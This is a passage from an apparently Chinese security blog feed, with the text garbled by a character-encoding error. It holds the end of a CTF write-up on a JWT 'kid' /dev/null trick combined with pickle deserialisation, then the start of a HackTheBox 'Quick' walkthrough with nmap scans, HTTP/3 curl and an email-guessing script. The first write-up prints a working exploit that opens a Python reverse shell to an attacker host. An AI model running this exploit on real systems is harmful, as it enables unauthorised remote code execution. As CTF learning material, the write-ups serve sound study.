srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è€Œhtmlæ–‡ä»¶è™½ç„¶æˆ‘ä»¬èƒ½ç›´æ¥è·å–ï¼Œä½†æ˜¯åˆ«å¿˜äº†è¿™å¤§æ¦‚ç‡æ˜¯flaskèµ·çš„webåº”ç”¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å°±ç®—èƒ½æŒ‡å®š<code>templates/index.html</code>ä½œä¸ºkeyï¼Œhtmlä¸­æ˜¯åŒ…å«æœ‰jinja2çš„æ¨¡æ¿è¯­å¥çš„ï¼Œè¿™ä¸€éƒ¨åˆ†ä»£ç æˆ‘ä»¬ä¹Ÿæ˜¯æ— æ³•æ§åˆ¶çš„ã€‚è¿™é‡Œæ”¾å‡ºæ‰’ä¸‹æ¥çš„html<br><img src="/2020/06/24/Make-jwt-great-again/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ‰€ä»¥è¯´ï¼Œé™æ€æ–‡ä»¶è¿™æ¡è·¯æ˜¯èµ°ä¸é€šçš„ã€‚çœ‹æ¥åªèƒ½å°è¯•ç³»ç»Ÿæ–‡ä»¶äº†ã€‚</p><p>ä½†è¿™é‡Œæˆ‘æƒ³å¤§éƒ¨åˆ†äººéƒ½æ²¡æƒ³è¿‡ï¼Œlinuxçš„ç³»ç»Ÿæ–‡ä»¶ä¸­æœ‰ä»€ä¹ˆæ˜¯å†…å®¹å¯æ§çš„ï¼Ÿè¿™å…¶å®ä¹Ÿæ˜¯ä¸€ä¸ªæœ‰è¶£çš„åœ°æ–¹ã€‚å¸¸è§å¦‚<code>/etc/passwd</code>ï¼Œ<code>/etc/hosts</code>ç­‰ç­‰éƒ½æ˜¯æ— æ³•é¢„æµ‹çš„ã€‚è€Œ<code>/proc/self</code>ç­‰ç­‰ä¹Ÿè®¸å­˜åœ¨ç©ºæ–‡ä»¶ä½†æ˜¯ä¸èƒ½ç™¾åˆ†ä¹‹ç™¾ç¡®å®šã€‚æœ‰æ²¡æœ‰ä»€ä¹ˆå†…å®¹æ˜¯ç™¾åˆ†ä¹‹ç™¾èƒ½å¤Ÿç¡®å®šçš„å‘¢ï¼Ÿ</p><p>æœ‰ã€‚ç­”æ¡ˆå°±æ˜¯<code>/dev/null</code></p><p>æˆ‘ä»¬éƒ½çŸ¥é“linuxå°†åƒåœ¾å†…å®¹æ‰”è¿›<code>/dev/null</code>æ˜¯å¸¸è§æ“ä½œã€‚è€Œæˆ‘ä»¬é€šå¸¸æ˜¯<code>echo log &gt; /dev/null 2&gt;&amp;1</code>æ¥å®Œæˆä¸€æ¬¡æ²¡æœ‰ä»»ä½•å›æ˜¾çš„ç›´æ¥æ“ä½œã€‚<code>/dev/null</code>èƒ½å¤Ÿä¸¢å¼ƒä¸€åˆ‡å†™å…¥å…¶ä¸­çš„æ•°æ®ã€‚è€Œè¯»å–å®ƒå°†ç«‹å³å¾—åˆ°ä¸€ä¸ªEOFã€‚</p><p>æ‰€ä»¥è¯´ï¼Œå¦‚æœæˆ‘ä»¬æ§åˆ¶kidè¯»å–<code>/dev/null</code>ä¸ºkey.æ­¤æ—¶æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ç©ºå­—ç¬¦ä¸²ä½œä¸ºHS256çš„secretkeyå°±èƒ½å¾—åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„key.</p><pre><code class="python">import jwtheaders={  &quot;typ&quot;: &quot;JWT&quot;,  &quot;alg&quot;: &quot;HS256&quot;,  &quot;kid&quot;: &quot;/dev/null&quot;}payload={}token=jwt.encode(payload,&#39;&#39;,algorithm=&quot;HS256&quot;,headers=headers).decode(&#39;utf-8&#39;)print(token)</code></pre><p>é€šè¿‡ä¸Šé¢çš„è„šæœ¬ï¼Œæˆ‘å‘ç°æ›´æ¢cookieæ—¶å¾—åˆ°çš„æŠ¥é”™å›æ˜¾ä¸å†æ˜¯<code>Invalid Signature</code>ï¼Œè€Œæ˜¯<code>Invalid load key</code><br>è¿™å…¶å®æ˜¯ä¸€ä¸ªå¥½æ¶ˆæ¯ï¼Œå› ä¸ºç»è¿‡æœç´¢åè¿™æ˜¯ä¸€ä¸ªpickleçš„æŠ¥é”™ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å·²ç»é€šè¿‡æ ¡éªŒäº†ï¼Œåªè¦å‰©ä¸‹çš„payloadéƒ¨åˆ†æ˜¯æœ‰æ•ˆçš„picklebase64æ•°æ®å³å¯ã€‚</p><p>ç„¶è€Œä»”ç»†ä¸€æƒ³å‘ç°é—®é¢˜ä¸å¯¹ã€‚jwtä½œä¸º<code>json web token</code>ï¼Œæœ‰æ•ˆçš„ä¼ è¾“æ•°æ®éƒ½åº”è¯¥æ˜¯jsonæ•°æ®ã€‚ä½†è¿™é‡Œå±…ç„¶ç›´æ¥æŠŠpickleçš„opcodebase64åæ”¾åœ¨äº†payloadéƒ¨åˆ†ã€‚è¿™è®©å½“æ—¶çš„æˆ‘æ— æ³•ç†è§£ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€ï¼špayloadçš„åŸå§‹å†…å®¹åœ¨pythonä¸­ä¸æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ— æ³•ç›´æ¥é€šè¿‡pyjwtåº“è¿›è¡Œå¯†æ–‡ç”Ÿæˆã€‚</p><p>äºæ˜¯æˆ‘å»æ‰¾èµ„æ–™ã€‚å‘ç°å…¶å®jwtçš„HS256ç­¾åæ˜¯hmac-sha256ç”Ÿæˆçš„ã€‚å…¶ä¸­keyæ˜¯jwtçš„secretkey.dataæ˜¯<code>base64(header).base64(payload)</code>æ•´ä½“</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è„šæœ¬æ‰‹åŠ¨æ‹¼æ¥ã€‚<br>ä¸‹é¢ç›´æ¥ç»™å‡ºå®Œæ•´çš„exp</p><pre><code class="python">import pickleimport osimport base64from hashlib import sha256import hmacclass exp(object):    def __reduce__(self):        s = &quot;&quot;&quot;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;VPSIP&quot;,9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;   &quot;&quot;&quot;        return (os.system, (s,))e = exp()payload=base64.urlsafe_b64encode(pickle.dumps(e)).decode(&#39;utf-8&#39;)#print(payload)key = &quot;&quot;.encode(&#39;utf-8&#39;)data =(&quot;eyJraWQiOiIvZGV2L251bGwiLCJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.&quot;+payload).encode(&#39;utf-8&#39;)#print(data)signature = base64.urlsafe_b64encode(hmac.new(key,data,digestmod=sha256).digest())#print(signature)print(data.decode()+&#39;.&#39;+signature.decode().rstrip(&#39;=&#39;))</code></pre><p>è§£é‡Šå‡ ç‚¹<br>1.payloadéƒ¨åˆ†pickleä¸cPickleéƒ½å¯ä»¥ã€‚ä½†æ˜¯è¿™é‡Œæ˜¯python3ç¯å¢ƒï¼Œè¿˜æ˜¯å¾—ç”¨python3ç”Ÿæˆã€‚</p><p>2.æ³¨æ„æˆ‘ä½¿ç”¨äº†<code>base64.urlsafe_b64encode</code>è€Œä¸æ˜¯<code>base64encode</code>ã€‚è¿™ç‚¹ä¸Šé¢ä¹Ÿè®²è¿‡äº†ï¼Œjwtä¸­ä¸ä¼šå‡ºç°<code>/</code>å’Œ<code>=</code>è¿™æ ·çš„å­—ç¬¦çš„ã€‚æ¯”èµ›ä¸­æˆ‘å¹¶æ²¡æœ‰å»è¯¦ç»†æŸ¥è¯¢ï¼Œè€Œæ˜¯ç›´æ¥æ‰‹åŠ¨å°†<code>/</code>æ›¿æ¢æˆ<code>_</code>å¹¶å»æ‰<code>=</code>åŒæ ·å¾—åˆ°äº†æœ‰æ•ˆçš„key.</p><p>3.è¿™é‡Œç”Ÿæˆpickleçš„payloadæˆ‘ä¹ŸåŒæ ·åšäº†ç‚¹æ‰‹è„šï¼šåœ¨å¼¹shellçš„ä»£ç ååŠ äº†å‡ ä¸ªç©ºæ ¼ã€‚åŸå› åŒä¸Šï¼Œå› ä¸ºpayloadéƒ¨åˆ†åŒæ ·ä¸å…è®¸<code>=</code>è¿™æ ·çš„å­—ç¬¦ã€‚æ‰€ä»¥å¯ä»¥æ‰‹åŠ¨åŠ ç©ºæ ¼é˜²æ­¢å‡ºç°<code>=</code>.</p><p>4.å¼¹shellåªå¯èƒ½ä½¿ç”¨pythonæˆ–bashåå¼¹shell.å› ä¸ºè¿™ä¸ªé¶æœºçœŸçš„å•¥éƒ½æ²¡æœ‰ï¼ˆcurl,wget,ncï¼‰ã€‚å½“ç„¶å¦‚æœæ¸—é€linuxé¶æœºåšå¤šäº†ä¹Ÿèƒ½å‘ç°pythonå¼¹shellçœŸçš„ä¸‡é‡‘æ²¹ã€‚æ²¡æœ‰ç”¨bashçº¯ç²¹æ˜¯å› ä¸ºæå¿˜äº†:(</p><p>5.æœ€åwpæ”¾å‡ºæ¥åæœ‰ç½‘å‹è¯´ç›´æ¥ç…§æ¬æˆ‘çš„expæœåŠ¡ç«¯ä¼šæŠ¥é”™<code>module &#39;nt&#39; not found</code>ã€‚æˆ‘è¯•äº†ä¸‹å‘ç°å±…ç„¶çœŸçš„æœ‰è¿™ä¸ªé—®é¢˜ã€‚ä½†æ˜¯æ¯”èµ›æ—¶æˆ‘æ˜¯ç”¨vpsä¸Šçš„python3.5ç”Ÿæˆçš„payload,ç»æµ‹è¯•è¿˜æ˜¯å¯ä»¥æˆåŠŸRCEã€‚è€Œæ¢åˆ°æœ¬æœºä¸Šçš„python3.7å°±å‡ºé”™äº†ã€‚æœ€åå¯¹æ¯”payloadå‘ç°ä¸¤è€…ç”Ÿæˆçš„ç­¾åä¸ä¸€è‡´ï¼Œè¿™é‡Œæˆ‘åªèƒ½æ¨æ–­æ˜¯åŠ å¯†ç®—æ³•çš„é—®é¢˜ã€‚æ¯•ç«Ÿæœ¬æœºä¸Šçš„pycryptoæˆ‘ä¸€ç›´æ²¡å¼„å¥½è¿‡ã€‚</p><p>æœ€åæˆåŠŸå¼¹shell.<br><img src="/2020/06/24/Make-jwt-great-again/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>jwtå®‰å…¨çš„ç›¸å…³æ¼æ´æˆ‘è®¤ä¸ºåŸºæœ¬ä¸Šå°±åªæœ‰ä»¥ä¸Šè¿™äº›äº†ã€‚å› ä¸ºå…¶å®å…¶ä»–ç›¸å…³çš„æ´æˆ–å¤šæˆ–å°‘éƒ½ä¸æ­¤ç›¸å…³ã€‚åªè¦æŒæ¡äº†è¿™äº›å¸¸è§å¯åˆ©ç”¨çš„ç‚¹ï¼Œå¹¶ä¸”äº†è§£ä¸€ä¸‹ç®—æ³•çš„æµç¨‹ï¼Œå³ä½¿ç¢°åˆ°æœ€åä¸€é“é¢˜è¿™ç§å˜é€šæ€§æå¼ºçš„ä¹Ÿèƒ½é¡ºç€æ€è·¯èµ°ä¸‹å»</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Quick-ä¸€æ¬¡è‰°éš¾çš„æ¸—é€</title>
      <link href="2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/"/>
      <url>2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>å› ä¸ºç°åœ¨è¿˜æ²¡æœ‰æ¥åˆ°ç¡®åˆ‡é€šçŸ¥è¯´æ˜¯å¦è€ƒè¯•,åŸæœ¬æœŸæœ«å¤ä¹ çš„è®¡åˆ’ä¹Ÿè¢«æ‰“ä¹±äº†ã€‚æ—¢ç„¶ç°åœ¨å¤ä¹ è§‰å¾—æœ‰ç‚¹äºï¼Œäºæ˜¯å¹²è„†å»åšåšhacktheboxçš„é¶æœºç®—äº†ï¼Œæ­£å¥½å¥½ä¹…æ²¡å†™wpäº†2333ã€‚</p><p>è™½ç„¶æ²¡æ›´æ–°æ–‡ç« ï¼Œä½†æ˜¯å…¶å®è‡ªå·±æ¯å‘¨éƒ½åœ¨è·Ÿç€ippsecçš„è§†é¢‘åšé€€å½¹é¶æœºã€‚å½“ç„¶å…¶å®ä¹Ÿåšäº†5.6å°ç°å½¹çš„ã€‚ä¸è¿‡ä»Šå¤©è¦å†™çš„Quické¶æœºçš„wpæ˜¯è‡ªå·±å¤´ä¸€æ¬¡ç‹¬ç«‹å®Œæˆçš„å›°éš¾éš¾åº¦çš„é¶æœºã€‚çœŸçš„çœŸçš„å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ã€‚æ‰€ä»¥ä¸€å®šè¦è®°å½•ä¸‹ã€‚</p><p>å¦å¤–ç”±äºQuickè¿˜æ˜¯activeçŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘ä¼šç»™æ–‡ç« ä¸Šé”ç›´åˆ°é¶æœºé€€å½¹ã€‚</p><p><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/head.PNG" class="lazyload" data-srcset="head.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><a id="more"></a><ul><li>é¶æœºip: 10.10.10.186</li><li>æ”»å‡»æœº: 10.10.14.40</li></ul><h2 id="initial-foothold"><a href="#initial-foothold" class="headerlink" title="initial foothold"></a>initial foothold</h2><p>è¿™ä¸€éƒ¨åˆ†çœŸçš„æŒºéº»çƒ¦çš„â€¦â€¦ä¸­é—´æœ‰ç‚¹ç‚¹è„‘æ´çš„æˆåˆ†,ä½†æ€»ä½“è¿˜æ˜¯æ¯”è¾ƒç¬¦åˆçœŸå®ç¯å¢ƒçš„ã€‚</p><p>é¦–å…ˆå¿…ç„¶æ˜¯nmapç«¯å£æ‰«æã€‚</p><pre><code class="bash"># Nmap 7.80 scan initiated Thu Jun 18 14:43:20 2020 as: nmap -sC -sV -oA nmap/quick 10.10.10.186Nmap scan report for 10.10.10.186Host is up (0.44s latency).Not shown: 998 closed portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Quick | Broadband ServicesService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Jun 18 14:46:54 2020 -- 1 IP address (1 host up) scanned in 214.65 seconds</code></pre><p>å¯ä»¥çœ‹åˆ°åªå¼€æ”¾äº†sshè·Ÿ9001webç«¯å£ã€‚å°è¯•è®¿é—®webé¡µé¢<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ä¼šå‘ç°ä¸»è¦ä¿¡æ¯æœ‰</p><ul><li>å‡ ä¸ªæ ‡å‡ºäº†å§“åè·Ÿå…¬å¸çš„ç•™è¨€</li><li>updateå¤„æŒ‡å‘äº†ä¸€ä¸ªç½‘é¡µ<code>https://portal.quick.htb</code></li></ul><p>åŒæ—¶åº•éƒ¨clientså®šå‘åˆ°clients.php<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä¼¼ä¹é‡Œé¢çš„å…¬å¸è·Ÿå‰é¢çš„äººåå¤‡æ³¨çš„å…¬å¸æœ‰ç›¸åŒçš„åœ°æ–¹ã€‚ç›®å‰åªèƒ½è¯´å¤§è‡´å¯ä»¥æ”¶é›†ä¸€äº›ä¿¡æ¯ã€‚<br>è®¿é—®<code>login.php</code>å‘ç°éœ€è¦ç”¨æˆ·åè·Ÿå¯†ç ã€‚ä¸è¿‡ï¼Œæ­¤å¤„çš„ç”¨æˆ·åè¦æ±‚ä¸ºé‚®ç®±ç™»å½•ã€‚å¯†ç åˆ™æ²¡æœ‰ä»€ä¹ˆé€éœ²çš„ä¿¡æ¯ã€‚</p><p>webé¡µé¢çš„ä¿¡æ¯æ”¶é›†å®Œäº†ï¼Œå°±åº”è¯¥è¯•è¯•<code>https://portal.quick.htb</code>äº†</p><p>ç„¶è€Œå¥‡æ€ªçš„æ˜¯,æˆ‘ä»¬æ ¹æœ¬æ²¡æœ‰åŠæ³•è®¿é—®è¿™ä¸ªç½‘é¡µ(åœ¨ä¿®æ”¹äº†<code>/etc/hosts</code>çš„å‰æä¸‹)ã€‚å°è¯•ç›´æ¥curlä¹ŸåŒæ ·æ— æœã€‚è¿™æ—¶ç›´æ¥é™·å…¥åƒµå±€ã€‚</p><p>åœ¨é€›äº†ä¸€åœˆhtbçš„è®ºå›åï¼Œå‘ç°å¤§å®¶æåˆ°äº†é‡æ–°buildå·¥å…·è¿™ä¸ªå…³é”®ä¿¡æ¯ã€‚å¹¶ä¸”æåˆ°äº†ï¼Œå¦‚æœè®¿é—®ä¸äº†è¿™ä¸ªé¡µé¢ï¼Œæ˜¯å› ä¸ºæµè§ˆå™¨æ— æ³•ç†è§£æ”¶åˆ°çš„ä¿¡æ¯ã€‚æ‰€ä»¥è®¿é—®ä¸äº†ã€‚å¹¶ä¸”æœ€å¥½å°è¯•å…¶ä»–protocol.</p><p>åœ¨ç•™æ„åˆ°protocolè¿™ä¸ªå…³é”®è¯åï¼Œæˆ‘å¼€å§‹å°è¯•è·‘ä¸€éudpç«¯å£çš„nmap</p><pre><code class="bash"># Nmap 7.80 scan initiated Fri Jun 19 20:33:51 2020 as: nmap -sU -oA nmap/quick-udp 10.10.10.186Nmap scan report for portal.quick.htb (10.10.10.186)Host is up (0.43s latency).Not shown: 999 closed portsPORT    STATE         SERVICE443/udp open|filtered https# Nmap done at Fri Jun 19 20:50:40 2020 -- 1 IP address (1 host up) scanned in 1008.38 seconds</code></pre><p>åŸæ¥åœ¨udpçš„443ç«¯å£æœ‰httpsæœåŠ¡ã€‚çœ‹æ¥å¤§æ¦‚ç‡å°±æ˜¯æˆ‘ä»¬ä¹‹å‰çš„ç½‘ç«™äº†ã€‚æ­¤æ—¶æœç´¢ç›¸å…³ä¿¡æ¯ï¼Œä¼šå‘ç°è¿™åº”è¯¥æ˜¯HTTP/3åè®®ã€‚å› ä¸ºHTTP/3çš„ä¸€ä¸ªé‡è¦ç‰¹å¾å°±æ˜¯å°†å¼ƒç”¨TCPåè®®ï¼Œæ”¹ä¸ºä½¿ç”¨åŸºäºUDPåè®®çš„QUICåè®®å®ç°ã€‚<br>å¯ä»¥çœ‹ä¸‹ç»´åŸºè·Ÿè¿™ç¯‡æ–‡ç« ã€‚<br><a href="https://www.slideshare.net/bagder/http3-in-curl" target="_blank" rel="noopener">http3-in-curl</a></p><p>http/3åè®®è™½ç„¶æ˜¯æ–°è¶‹åŠ¿ï¼Œä½†æ˜¯ç›®å‰èƒ½å”¯ä¸€æœ‰æ•ˆè¿æ¥çš„å·¥å…·è¿˜æ˜¯åªæœ‰curl.æ‰€ä»¥æˆ‘çŒœæµ‹è®ºå›é‡Œå¤§å®¶æåˆ°çš„å°±æ˜¯é‡æ–°ç¼–è¯‘curlä»¥æ”¯æŒhttp3.</p><p>ç„¶è€Œè¿™ä¸€æ­¥ååˆ†è€—æ—¶é—´ï¼Œå› ä¸ºå¿…é¡»è¦ä¸‹<code>Quiche</code>é‡æ–°ç¼–è¯‘ï¼Œä¸‹<code>brew</code>æ¥è¿›è¡ŒåŒ…ç®¡ç†â€¦â€¦æ€»ä¹‹æˆ‘è¿brewéƒ½æ²¡ä¸‹å®Œå°±æ”¾å¼ƒäº†è¿™ä¸ªé€‰æ‹©ï¼Œå› ä¸ºå›½å†…å®åœ¨å¤ªæ…¢äº†ï¼Œæ¢äº†gitæºååˆå› ä¸ºå…¶ä»–æºç»§ç»­é¾Ÿé€Ÿä¸‹è½½â€¦è¿™æ—¶æˆ‘åœ¨æœç´¢å†…å®¹ä¸­æ³¨æ„åˆ°dockeræœ‰ç°æˆçš„é•œåƒã€‚äºæ˜¯æœæ–­æ¢dockerè¿›è¡Œcurlã€‚(dockerçš„æœ€å¤§ä»·å€¼å°±æ˜¯ä¸ºæˆ‘ä»¬èŠ‚çœäº†é…ç¯å¢ƒçš„å¤§æŠŠæ—¶é—´)<br>pullä¸€ä¸ª<code>ymuski/curl-http3</code>é•œåƒ</p><pre><code class="bash">docker run -it --rm ymuski/curl-http3 curl -V </code></pre><p>æ£€æŸ¥ä¸‹æ”¯æŒhttp3.è¿™æ ·å°±å¯ä»¥ç”¨<code>--http3</code>æ¥è®¿é—®ç½‘å€äº†</p><pre><code class="bash">docker run -it --rm ymuski/curl-http3 curl https://10.10.10.186 --http3 </code></pre><p><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å‘ç°å‡ ä¸ªé“¾æ¥ã€‚ä¸€ä¸ªä¸ªè®¿é—®åå‘ç°docsæ–‡æ¡£æœ‰ä¸¤ä¸ªpdfã€‚</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;&lt;h1&gt;Quick | References&lt;/h1&gt;&lt;ul&gt;  &lt;li&gt;&lt;a href=&quot;docs/QuickStart.pdf&quot;&gt;Quick-Start Guide&lt;/a&gt;&lt;/li&gt;  &lt;li&gt;&lt;a href=&quot;docs/Connectivity.pdf&quot;&gt;Connectivity Guide&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/head&gt;&lt;/html&gt;</code></pre><p>å¼€å§‹æœæ–­å°è¯•ç›´æ¥<code>-o</code>è¾“å‡ºï¼Œä½†æ˜¯å´æå¿˜äº†ï¼Œè¿™é‡Œæ˜¯è°ƒç”¨çš„dockeræ‰§è¡Œå‘½ä»¤ã€‚é‚£ä¹ˆæˆ‘ä»¬çš„è¾“å‡ºåœ¨é•œåƒé‡Œé¢ã€‚æ‰€ä»¥æˆ‘å¾—æŒ‚è½½ä¸€ä¸ªç›®å½•æ¥è·å–è¾“å‡ºçš„pdf</p><pre><code class="bash">docker run -it --rm -v /mnt/curl:/tmp ymuski/curl-http3 curl 10.10.10.186 --http3 -o /tmp/xxx.pdf</code></pre><p>åœ¨å…¶ä¸­ä¸€ä¸ªpdfä¸­å¾—åˆ°å…³é”®ä¿¡æ¯ã€‚ä¹Ÿå°±æ˜¯å¯†ç ã€‚<br><img src="/2020/06/23/hackthebox-Quick-%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E6%B8%97%E9%80%8F/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯å°è¯•ç™»å½•äº†ã€‚è¿™ä¹Ÿæ˜¯èµ·æ‰‹å¼è¿™é‡Œåˆä¸€ä¸ªéš¾ç‚¹ã€‚åŸå…ˆhtbçš„é‚®ç®±åŸºæœ¬ä¸Šéƒ½æ˜¯<code>admin@{boxçš„hostname}.htb</code>è¿™ç§å½¢å¼çš„ã€‚ä½†æ˜¯æ­¤å¤„å¸¸è§„å°è¯•éƒ½ä¸èµ·æ•ˆæœã€‚äºæ˜¯åªèƒ½æ‰‹åŠ¨å†™è„šæœ¬ç»„åˆä¸‹ä¹‹å‰çš„ä¿¡æ¯ã€‚</p><pre><code class="python">list=[]users=[&#39;tim&#39;,&#39;roy&#39;,&#39;elisa&#39;,&#39;james&#39;,&#39;mike&#39;,&#39;jane&#39;,&#39;john&#39;]postfix=[&#39;qconsulting.co.uk&#39;,&#39;darkwing.com&#39;,&#39;wink.co.uk&#39;,&#39;lazycoop.cn&#39;,&#39;scoobydoo.it&#39;,&#39;penguincrop.fr&#39;]postfix2=[&#39;qconsulting.co.uk&#39;,&#39;darkwing.com&#39;,&#39;wink.co.uk&#39;,&#39;lazycoop.com.cn&#39;,&#39;scoobydoo.co.it&#39;,&#39;penguincrop.co.fr&#39;]postfix3=[&#39;qconsulting.htb.uk&#39;,&#39;darkwing.htb&#39;,&#39;wink.htb.uk&#39;,&#39;lazycoop.htb.cn&#39;,&#39;scoobydoo.htb.it&#39;,&#39;penguincrop.htb.fr&#39;]def quick():    global list    for i in users:        for j in postfix:            list.append(i+&#39;@&#39;+j)    return listdef quick2():    global list    for i in users:        for j in postfix2:            list.append(i+&#39;@&#39;+j)    return listdef quick3():    global list    for i in users:        for j in postfix3:            list.append(i+&#39;@&#39;+j)    return listf=open(&#39;creds.txt&#39;,&#39;w&#39;)for email in quick():    f.write(email+&#39;\n&#39;)for email in quick2():    f.write(email+&#39;\n&#39;)for email in quick3():    f.write(email+&#39;\n&#39;)f.close()</code></pre><p>æœ€åå°è¯•å‡ºç»“æœåæ‰å‘ç°å…¶å®ä¸éœ€è¦è¿‡å¤šå°è¯•çš„ã€‚ä½†æ˜¯é‡ç‚¹(éš¾ç‚¹)å°±åœ¨äºï¼Œå®ƒçš„é‚®ç®±æ 